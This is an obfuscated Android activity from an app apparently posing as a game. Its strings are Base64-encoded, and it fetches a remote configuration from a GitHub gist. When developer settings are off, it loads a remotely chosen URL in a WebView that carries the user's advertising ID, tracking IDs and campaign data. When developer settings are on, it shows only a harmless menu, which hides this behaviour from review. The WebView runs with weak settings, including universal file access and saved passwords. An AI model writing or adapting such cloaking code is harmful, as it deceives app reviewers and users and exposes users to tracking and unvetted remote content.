package com.iinncerredible.jjookker.irepc;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.iitr.kaishu.nsidedprogressbar.NSidedProgressBar;
import com.onesignal.OneSignal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;

import github.ishaan.buttonprogressbar.ButtonProgressBar;

public class IJ extends AppCompatActivity {

    String uuysb;
    int idkl;
    int oimd = 0;
    static NSidedProgressBar nSidedProgressBar;
    static ButtonProgressBar bpb_SSS,bpb_PPP,bpb_CCC;
    static FrameLayout fraaa;
    public static NavController ysgad;
    public static boolean ookk = false;
    public static ValueCallback<Uri> udsha;
    public Uri isdujas = null;
    public ValueCallback<Uri[]> jjjajq;
    public String mjcbs;
    public static final int ydggqx = 1;
    public static String hhahqaa;
    public static String iuhdha = "";
    public static String udhskj;
    public static String udhsj;
    public static String usga = "ekNzaHZaeEhaQjRWUnJ5Z3FQTHpOZw==";

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onStart() {
        super.onStart();

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(IJ.ddddeee("Y2ZjYmRkMzAtY2U1Yi00Y2ZiLWI0ZjQtMTNiNGVjZjUyOWVk"));


        new Thread(new Runnable() {
            @Override
            public void run() {
               try {
                   udhskj = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
               }catch (Exception e){

               }
            }
        }).start();

        hhahqaa = AppsFlyerLib.getInstance().getAppsFlyerUID(this);

    }

    @Override
    public void onBackPressed() {
        boolean uu = true;
        if (ookk == uu){
           startActivity(new Intent(getApplicationContext(),IJ.class));
           finishAffinity();
        }else {
            if (WppppOOf.uuuuuu.isFocused() && WppppOOf.uuuuuu.canGoBack()) {
                WppppOOf.uuuuuu.goBack();
            }
        }
    }

    private void odk(){

        idkl = Settings.Secure.getInt(this.getContentResolver(),
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0);
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {

        if (requestCode != ydggqx || jjjajq == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (mjcbs != null) {
                    results = new Uri[]{Uri.parse(mjcbs)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        jjjajq.onReceiveValue(results);
        jjjajq = null;
        if (udsha == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? isdujas : data.getData();
            }
        } catch (Exception e) { }
        udsha.onReceiveValue(result);
        udsha = null;


    }

    public static void bbbbuut(IJ ij){
        nSidedProgressBar.setVisibility(View.INVISIBLE);
        bpb_SSS.setVisibility(View.VISIBLE);
        bpb_PPP.setVisibility(View.VISIBLE);
        bpb_CCC.setVisibility(View.VISIBLE);

        bpb_SSS.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                bpb_SSS.startLoader();
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        bpb_SSS.stopLoader();
                        ij.startActivity(new Intent(ij.getApplicationContext(),MainActivity.class));

                    }
                }, 2000);
            }
        });
        bpb_PPP.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                bpb_PPP.startLoader();
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        bpb_PPP.stopLoader();
                        fraaa.setVisibility(View.VISIBLE);
                        ysgad.navigate(R.id.WOFFFow);
                        ookk = true;

                    }
                }, 2000);
            }
        });
        bpb_CCC.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                bpb_CCC.startLoader();
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        bpb_CCC.stopLoader();
                        ij.finishAffinity();


                    }
                }, 2000);
            }
        });
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(1024);
        setContentView(R.layout.ij);

        WebClientOOOOO.ij = this;
        AppsFlyerLib.getInstance().init(IJ.ddddeee(usga), new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {

                iuhdha = map.get(IJ.ddddeee("YWZfc3RhdHVz")).toString();
                if (iuhdha.equals(IJ.ddddeee("Tm9uLW9yZ2FuaWM="))){
                    String str =map.get(IJ.ddddeee("Y2FtcGFpZ24=")).toString();
                    udhsj = Prrrr.prrr(str,getPackageName(), udhskj, hhahqaa);
                }
            }

            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        },getApplicationContext());
        AppsFlyerLib.getInstance().start(getApplicationContext());



        ysgad = Navigation.findNavController(this, R.id.nav_host_fragment);
        odk();
        WebChromeOOOOO.ij = this;
        nSidedProgressBar = findViewById(R.id.NSidedProgressBar);
        bpb_SSS = findViewById(R.id.bpb_SSS);
        bpb_PPP = findViewById(R.id.bpb_PPP);
        bpb_CCC = findViewById(R.id.bpb_CCC);
        fraaa = findViewById(R.id.fraaa);

        if (idkl == oimd){

            Iooi iooi = new Iooi();
            iooi.setIj(this);
            uuysb= getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(IJ.ddddeee("c2F2ZWRVcmw="), "null");
            iooi.iooi();


        }else {

            bbbbuut(this);
        }

    }


    public static void seettt(WebView uuuuuu){

        uuuuuu.getSettings().setLoadsImagesAutomatically(true);
        uuuuuu.setSaveEnabled(true);
        uuuuuu.getSettings().setMixedContentMode(0);
        uuuuuu.setFocusable(true);
        uuuuuu.getSettings().setAllowUniversalAccessFromFileURLs(true);
        uuuuuu.getSettings().setJavaScriptEnabled(true);
        uuuuuu.getSettings().setAllowContentAccess(true);
        uuuuuu.getSettings().setLoadWithOverviewMode(true);
        uuuuuu.getSettings().setEnableSmoothTransition(true);
        uuuuuu.getSettings().setUseWideViewPort(true);
        uuuuuu.getSettings().setSaveFormData(true);
        uuuuuu.getSettings().setAllowFileAccess(true);
        uuuuuu.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        uuuuuu.getSettings().setDomStorageEnabled(true);
        uuuuuu.setFocusableInTouchMode(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(uuuuuu, true);
        CookieManager.getInstance().setAcceptCookie(true);
        uuuuuu.setVisibility(View.VISIBLE);
        uuuuuu.getSettings().setAllowFileAccessFromFileURLs(true);
        uuuuuu.getSettings().setSavePassword(true);
        uuuuuu.getSettings().setDatabaseEnabled(true);
        uuuuuu.getSettings().setRenderPriority(android.webkit.WebSettings.RenderPriority.HIGH);
        uuuuuu.getSettings().setCacheMode(android.webkit.WebSettings.LOAD_DEFAULT);
        uuuuuu.getSettings().setAppCacheEnabled(true);
        uuuuuu.setWebViewClient(new WebClientOOOOO());
        uuuuuu.setWebChromeClient(new WebChromeOOOOO());
    }


    private static class WebClientOOOOO extends WebViewClient{
        public static IJ ij;
        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            ij.getSharedPreferences(ij.getPackageName(), MODE_PRIVATE).edit().putString(IJ.ddddeee("c2F2ZWRVcmw="),url).apply();
        }

        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            if(url.contains(IJ.ddddeee("NDA0"))){
                ij.startActivity(new Intent(ij.getApplicationContext(),MainActivity.class));
                ij.finishAffinity();
            }
        }
    }


    private static class WebChromeOOOOO extends WebChromeClient{

       public static IJ ij;


        @RequiresApi(api = Build.VERSION_CODES.O)
        @Override
        public boolean onShowFileChooser(WebView view,
                                         ValueCallback<Uri[]> filePath,
                                         FileChooserParams fileChooserParams) {
            if (ij.jjjajq != null) {
                ij.jjjajq.onReceiveValue(null);
            }
            ij.jjjajq = filePath;
            Intent ydfsa = new Intent(Intent.ACTION_GET_CONTENT);
            ydfsa.addCategory(Intent.CATEGORY_OPENABLE);
            ydfsa.setType("*/*");
            Intent[] intentArray = new Intent[0];
            Intent yysgx = new Intent(Intent.ACTION_CHOOSER);
            yysgx.putExtra(Intent.EXTRA_INTENT, ydfsa);
            yysgx.putExtra(Intent.EXTRA_TITLE, IJ.ddddeee("U2VsZWN0IE9wdGlvbjo="));
            yysgx.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
            ij.startActivityForResult(yysgx, 1);
            return true;
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    static String ddddeee(String xsjs){
        byte[] decoded = android.util.Base64.decode(xsjs, Base64.DEFAULT);
        return new String(decoded);
    }

    static String uuuyyau;
    static String qqwasxz;
    static String oooiix;

    private class Iooi{
        IJ ij;
        static final String ioio = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9BcnR1cjIyNDQxOTkzLzUxM2FkNjEyZDNiYWZiNGIxMWQxNmM0OTU3N2M3NmNjL3Jhdy9JbmNyZWRpYmxlX0pva2Vy";

        public IJ getIj() {
            return ij;
        }

        public void setIj(IJ ij) {
            this.ij = ij;
        }

        public void iooi(){


            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {
                    try {

                        HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(IJ.ddddeee(ioio)).openConnection();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                        String iutr = bufferedReader.readLine();

                        String [] hfj = WOFFFow.spli(iutr);
                        uuuyyau = hfj[0];
                        qqwasxz = hfj[1];
                        oooiix = hfj[2];

                        ij.runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Fbbbbbf.fbbbf(ij);
                                Fbbbbbf.fbbfc(ij);


                                if (uuysb.equals("null")){
                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            Offf.off(ij);

                                        }
                                    },6000);

                                }else {

                                    WppppOOf.log = uuysb;
                                    fraaa.setVisibility(View.VISIBLE);
                                    ysgad.navigate(R.id.wppppOOf);

                                }

                            }
                        });


                    }catch (Exception e){

                        bbbbuut(ij);
                    }
                }
            }).start();

        }

    }

    public static class Offf{
        @RequiresApi(api = Build.VERSION_CODES.O)
        public static void off(IJ ij){

            String ufhd = IJ.iuhdha;
            if (ufhd.equals(IJ.ddddeee("Tm9uLW9yZ2FuaWM="))){
                WppppOOf.log = uuuyyau + IJ.udhsj;
                fraaa.setVisibility(View.VISIBLE);
                ysgad.navigate(R.id.wppppOOf);

            }else if(uysvb != null) {
                WppppOOf.log = uuuyyau + qwqsa;
                fraaa.setVisibility(View.VISIBLE);
                ysgad.navigate(R.id.wppppOOf);

            }else {
                if (qqwasxz.equals(IJ.ddddeee("Tk8="))) {
                    bbbbuut(ij);
                }else {
                    String ituhd = qqwasxz + IJ.ddddeee("P2J1bmRsZT0=") + ij.getPackageName() + IJ.ddddeee("JmFkX2lkPQ==") + udhskj + IJ.ddddeee("JmFwcHNfaWQ9") +
                            hhahqaa + IJ.ddddeee("JmRldl9rZXk9") + IJ.ddddeee(usga);
                    WppppOOf.log  = uuuyyau + ituhd;
                    fraaa.setVisibility(View.VISIBLE);
                    ysgad.navigate(R.id.wppppOOf);
                }
            }

        }
    }



   public static String uysvb;
   public static String qwqsa;

    private static class Fbbbbbf{

       private static void fbbbf(IJ ij){
           FacebookSdk.setApplicationId(oooiix);
           FacebookSdk.setAdvertiserIDCollectionEnabled(true);
           FacebookSdk.sdkInitialize(ij.getApplicationContext());
           FacebookSdk.fullyInitialize();
           FacebookSdk.setAutoInitEnabled(true);
           FacebookSdk.setAutoLogAppEventsEnabled(true);
       }

       private static void fbbfc (IJ ij){

           AppEventsLogger.activateApp(ij.getApplication());
           AppLinkData.fetchDeferredAppLinkData(ij.getApplicationContext(), new AppLinkData.CompletionHandler() {
               @RequiresApi(api = Build.VERSION_CODES.O)
               @Override
               public void onDeferredAppLinkDataFetched(@Nullable AppLinkData yttfaf) {
                   if (yttfaf == null) {
                       yttfaf = AppLinkData.createFromActivity(ij);
                   }
                   if (yttfaf != null) {
                       Uri ydsvsx = yttfaf.getTargetUri();
                       uysvb = ydsvsx.getQuery();
                       qwqsa = Prrrr.prrr(uysvb,ij.getPackageName(), udhskj, hhahqaa);

                   }else {

                   }
               }
           });
       }

    }

    public static class Prrrr{
        private static String ifuhfs;
        private static String hjdjh;
        private static String hsa;
        private static String uygdsk;
        private static String uydb;
        private static String iudh;
        private static String jsdjs;
        private static String[] uybs;

        @RequiresApi(api = Build.VERSION_CODES.O)
        public static String prrr(String ugdf, String iiuj, String iuydg, String qwqwqa){


            uybs = ugdf.split("::");

            try {
                uydb = uybs[4];
            }catch (Exception e){
                uydb = "";
            }

            try {
                iudh = uybs[5];
            }catch (Exception e){
                iudh = "";
            }

            try {
                jsdjs = uybs[6];
            }catch (Exception e){
                jsdjs = "";
            }

            try {
                ifuhfs = uybs[0];
            }catch (Exception e){
                ifuhfs = "";
            }
            try {
                hjdjh = uybs[1];
            }catch (Exception e){
                hjdjh = "";
            }

            try {
                hsa = uybs[2];
            }catch (Exception e){
                hsa = "";

            }

            try {
                uygdsk = uybs[3];
            }catch (Exception e){
                uygdsk = "";
            }



            OneSignal.sendTag(IJ.ddddeee("c3ViX2FwcA=="), hjdjh);

            String iuhsg = ifuhfs + IJ.ddddeee("P2J1bmRsZT0=") + iiuj + IJ.ddddeee("JmFkX2lkPQ==") + iuydg + IJ.ddddeee("JmFwcHNfaWQ9") + qwqwqa +
                    IJ.ddddeee("JnN1YjY9") + hjdjh +
                    IJ.ddddeee("JnN1Yjc9") + hsa +
                    IJ.ddddeee("JnN1YjI9") + uygdsk +
                    IJ.ddddeee("JnN1YjM9") + uydb +
                    IJ.ddddeee("JnN1YjQ9") + iudh +
                    IJ.ddddeee("JmRldl9rZXk9") + IJ.ddddeee(usga);
            return iuhsg;
        }

    }

}
